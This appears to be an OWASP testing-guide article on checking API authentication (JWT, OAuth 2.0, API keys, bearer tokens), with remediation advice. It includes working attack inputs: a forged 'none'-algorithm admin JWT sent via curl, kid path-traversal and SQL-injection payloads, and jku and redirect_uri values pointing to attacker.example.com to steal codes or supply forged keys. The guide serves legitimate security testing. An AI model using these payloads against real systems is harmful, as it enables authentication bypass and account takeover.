# Testing API Authentication Mechanisms

|ID          |
|------------|
|WSTG-APIT-05|

## Summary

APIs rely on authentication mechanisms to verify the identity of callers
before granting access to protected resources. Common approaches include
JSON Web Tokens (JWT), OAuth 2.0 flows, API keys, and bearer tokens. Each
mechanism introduces its own class of weaknesses. A JWT signed with the
`none` algorithm passes signature verification on a misconfigured library.
An OAuth flow missing the `state` parameter is vulnerable to cross-site
request forgery. An API key transmitted in a URL query string leaks into
server logs, browser history, and proxy caches.

This article covers testing procedures for the authentication mechanisms
most frequently encountered in modern APIs. It complements the general
authentication tests in [section 4.4](../04-Authentication/README.md) with
API-specific scenarios such as token algorithm confusion, PKCE bypass, and
stateless session management weaknesses.

## Test Objectives

- Verify that JWT implementations reject tokens signed with the `none`
  algorithm and tokens signed with an unexpected algorithm.
- Confirm that OAuth 2.0 flows enforce the `state` parameter, validate
  `redirect_uri` strictly, and require PKCE where applicable.
- Assess whether API keys are scoped, rotated, and transmitted securely.
- Determine whether bearer tokens expire, are revocable, and cannot be
  reused after logout.
- Evaluate stateless session management for fixation and replay risks.

## How to Test

### Test JWT Token Validation

JSON Web Tokens consist of three Base64URL-encoded segments: a header, a
payload, and a signature. Weaknesses in how the server validates these
segments allow an attacker to forge tokens, escalate privileges, or bypass
authentication entirely.

#### 1. None Algorithm Attack

Decode the JWT header. Change the `alg` field to `none` and remove the
signature segment, leaving the trailing dot.

Original token header (decoded):

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Modified header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Construct the modified token by Base64URL-encoding the new header and the
original payload, joined by a dot, followed by a trailing dot and an empty
signature:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.
```

Send a request with the modified token:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ." \
  https://api.example.com/v1/admin/users
```

Insecure behavior: the server returns `200 OK` and processes the request.
Secure behavior: the server returns `401 Unauthorized` or `403 Forbidden`.

#### 2. Algorithm Confusion (RS256 to HS256)

When a server uses RS256 (asymmetric), it verifies tokens with a public
key. If the server also accepts HS256 (symmetric), an attacker who obtains
the public key can sign a token using HS256 with the public key as the
HMAC secret.

1. Retrieve the public key from the JWKS endpoint or TLS certificate:

   ```bash
   curl -s https://api.example.com/.well-known/jwks.json | jq '.keys[0]'
   ```

2. Convert the JWK to PEM format.
3. Create a new JWT with `"alg": "HS256"` in the header and a modified
   payload (for example, escalate the `role` claim to `admin`).
4. Sign it using the PEM public key as the HMAC-SHA256 secret.
5. Send a request with the forged token and observe the response.

Insecure behavior: the server accepts the HS256-signed token and grants
the escalated privileges.

#### 3. Expired Token Acceptance

Decode the JWT payload and note the `exp` claim. Wait until the token has
expired, then replay the request:

```bash
# Decode the payload to check expiry
echo "eyJ..." | base64 -d 2>/dev/null | jq '.exp'

# Send the expired token
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <expired-token>" \
  https://api.example.com/v1/profile
```

Insecure behavior: the server returns `200 OK` with valid data.

#### 4. Key ID (kid) Injection

The `kid` header parameter tells the server which key to use for
verification. If the server uses `kid` in a file path lookup or database
query without sanitization, injection is possible.

Test with a path traversal payload:

```json
{
  "alg": "HS256",
  "kid": "../../../dev/null",
  "typ": "JWT"
}
```

Sign the token with an empty string as the secret (the contents of
`/dev/null`). If the server accepts it, the `kid` parameter is vulnerable
to path traversal.

Test with a SQL injection payload:

```json
{
  "kid": "key1' UNION SELECT 'attacker-controlled-secret' -- ",
  "alg": "HS256"
}
```

Sign the token with `attacker-controlled-secret` as the HMAC key.

#### 5. JKU and X5U Header Manipulation

The `jku` (JWK Set URL) and `x5u` (X.509 URL) header parameters tell the
server where to fetch the signing key. If the server follows these URLs
without allowlist validation, point them to an attacker-controlled server
hosting a key pair you control:

```json
{
  "alg": "RS256",
  "jku": "https://attacker.example.com/.well-known/jwks.json"
}
```

Host a JWKS at that URL containing your public key. Sign the token with
your private key. If the server fetches and trusts the attacker-hosted
key, it accepts the forged token.

### Test OAuth 2.0 Flows

#### 1. Missing State Parameter (CSRF)

Initiate an authorization request and observe whether the `state`
parameter is present:

```
GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://app.example.com/callback&scope=read HTTP/1.1
Host: auth.example.com
```

If `state` is absent, craft a CSRF attack: place the authorization URL in
an `<img>` tag on an attacker-controlled page. When a victim visits the
page, the browser initiates the OAuth flow, and the resulting
authorization code binds to the victim's session under the attacker's
account.

Insecure behavior: the authorization server does not require or validate
`state`.

#### 2. Open Redirect in redirect_uri

Modify the `redirect_uri` parameter to an attacker-controlled domain:

```
GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.example.com/steal&scope=read&state=xyz HTTP/1.1
Host: auth.example.com
```

Test bypass techniques:

- Subdomain: `https://attacker.app.example.com/callback`
- Path traversal: `https://app.example.com/callback/../../../attacker.example.com`
- Parameter pollution: `redirect_uri=https://app.example.com/callback&redirect_uri=https://attacker.example.com`
- URL encoding: `redirect_uri=https://app.example.com%40attacker.example.com`
- Dot bypass: `redirect_uri=https://app.example.com.attacker.example.com`

Insecure behavior: the authorization server redirects the authorization
code or token to the attacker-controlled URI.

#### 3. PKCE Bypass

If the authorization server advertises PKCE support, test whether it
actually enforces it:

1. Initiate an authorization request without `code_challenge`:

   ```
   GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://app.example.com/callback HTTP/1.1
   ```

2. Exchange the authorization code without `code_verifier`:

   ```bash
   curl -X POST https://auth.example.com/token \
     -d "grant_type=authorization_code" \
     -d "code=AUTH_CODE" \
     -d "client_id=CLIENT_ID" \
     -d "redirect_uri=https://app.example.com/callback"
   ```

Insecure behavior: the server issues an access token without verifying
PKCE parameters.

#### 4. Scope Escalation

Request a token with minimal scope, then attempt to access resources that
require higher privileges:

```bash
# Request token with read-only scope
curl -X POST https://auth.example.com/token \
  -d "grant_type=client_credentials" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "scope=read"

# Attempt a write operation with the read-only token
curl -X DELETE \
  -H "Authorization: Bearer <read-only-token>" \
  https://api.example.com/v1/users/123
```

Also test whether the token exchange endpoint allows requesting a broader
scope than what was originally authorized:

```bash
curl -X POST https://auth.example.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "scope=read write admin"
```

Insecure behavior: the server grants a token with broader scope than
authorized, or the API does not enforce scope restrictions on resource
access.

#### 5. Token Leakage in URL Fragment

For implicit flow (`response_type=token`), observe whether the access
token appears in the URL fragment after redirect:

```
https://app.example.com/callback#access_token=eyJ...&token_type=bearer
```

Check the `Referer` header on subsequent requests from the callback page.
If the page loads external resources (analytics scripts, images), the
token in the fragment may leak through the `Referer` header. Also check
browser history and server access logs.

### Test API Key Security

#### 1. Key Transmission

Inspect whether the API key is sent in the URL query string or in a
header:

```bash
# Insecure: key in URL (logged by proxies, servers, CDNs)
curl "https://api.example.com/v1/data?api_key=sk_live_abc123"

# Secure: key in header
curl -H "X-API-Key: sk_live_abc123" https://api.example.com/v1/data
```

Check server access logs, proxy logs, and browser history for the key
value when sent as a query parameter.

#### 2. Key Scoping

Test whether a key issued for one service or environment works on another:

```bash
# Use a staging key against production
curl -H "X-API-Key: sk_staging_abc123" https://api.example.com/v1/data

# Use a read-only key for write operations
curl -X POST \
  -H "X-API-Key: sk_readonly_abc123" \
  -H "Content-Type: application/json" \
  -d '{"name": "test"}' \
  https://api.example.com/v1/resources
```

Insecure behavior: the key is accepted outside its intended scope.

#### 3. Key Rotation

Obtain a new API key through the key management interface. Test whether
the old key still works:

```bash
curl -H "X-API-Key: <old-key>" https://api.example.com/v1/data
```

Insecure behavior: the old key remains valid indefinitely after rotation.

### Test Bearer Token Lifecycle

#### 1. Token Lifetime

Decode the token (if JWT) or observe the `expires_in` field in the token
response. Assess whether the lifetime is appropriate:

- Access tokens longer than 1 hour increase the window for stolen token
  abuse.
- Refresh tokens without expiry allow indefinite access.

#### 2. Token Revocation

Authenticate, obtain a token, then log out or revoke the token. Replay
the revoked token:

```bash
# Log out / revoke
curl -X POST https://api.example.com/v1/auth/logout \
  -H "Authorization: Bearer <token>"

# Replay the revoked token
curl -H "Authorization: Bearer <token>" \
  https://api.example.com/v1/profile
```

Insecure behavior: the revoked token still grants access.

#### 3. Token Reuse After Password Change

Change the user's password, then replay a token issued before the
password change:

```bash
# Change password
curl -X POST https://api.example.com/v1/auth/change-password \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"old_password": "old", "new_password": "new"}'

# Replay the pre-change token
curl -H "Authorization: Bearer <token>" \
  https://api.example.com/v1/profile
```

Insecure behavior: the old token continues to work after a password
change.

### Test Stateless Session Management

#### 1. Session Fixation via API

Obtain a session token (or JWT) before authentication. Authenticate using
the same token. Check whether the server issues a new token after
authentication or continues to use the pre-authentication token:

```bash
# Pre-auth: obtain an anonymous token
TOKEN=$(curl -s https://api.example.com/v1/auth/init | jq -r '.token')

# Authenticate with the anonymous token
curl -X POST https://api.example.com/v1/auth/login \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username": "user", "password": "pass"}'
```

Insecure behavior: the server does not issue a new token after
authentication. An attacker who fixes the pre-auth token can hijack the
authenticated session.

#### 2. Token Replay Across Sessions

Obtain two tokens for different users. Send User A's token in User B's
session context (for example, from a different IP or with a different
`User-Agent`):

```bash
curl -H "Authorization: Bearer <user-a-token>" \
  -H "User-Agent: DifferentBrowser/1.0" \
  https://api.example.com/v1/profile
```

Check whether the server binds tokens to any client fingerprint (IP,
User-Agent, or TLS session). Note that IP binding is not always practical
for mobile clients, but the server should at minimum detect and log token
use from unexpected origins.

## Remediation

- Validate the JWT `alg` header against a strict allowlist and reject
  `none` unconditionally. Pin the expected algorithm on the server side
  rather than reading it from the token header.
- Store signing keys securely and rotate them periodically. Never use
  public keys as HMAC secrets.
- Validate `jku` and `x5u` headers against a strict allowlist of trusted
  URLs. Prefer local key storage over remote key fetching.
- Enforce the `state` parameter in OAuth flows and validate it on the
  callback. Use exact `redirect_uri` matching.
- Require PKCE for all public clients and enforce `code_verifier`
  validation at the token endpoint.
- Transmit API keys in headers, not URL parameters. Scope keys to
  specific services and environments. Implement automatic key rotation.
- Set appropriate token lifetimes. Invalidate tokens on logout, password
  change, and privilege change. Maintain a token revocation list or use
  short-lived tokens with refresh token rotation.
- Issue new session identifiers after authentication to prevent session
  fixation.

## References

- [OWASP Testing Guide: Testing for Credentials Transported over an Encrypted Channel](../04-Authentication/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md)
- [OWASP Testing Guide: Testing for Weak Lock Out Mechanism](../04-Authentication/03-Testing_for_Weak_Lock_Out_Mechanism.md)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html)
- [RFC 7519: JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7636: Proof Key for Code Exchange (PKCE)](https://datatracker.ietf.org/doc/html/rfc7636)
- [RFC 6749: The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-294: Authentication Bypass by Capture-replay](https://cwe.mitre.org/data/definitions/294.html)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [CWE-613: Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
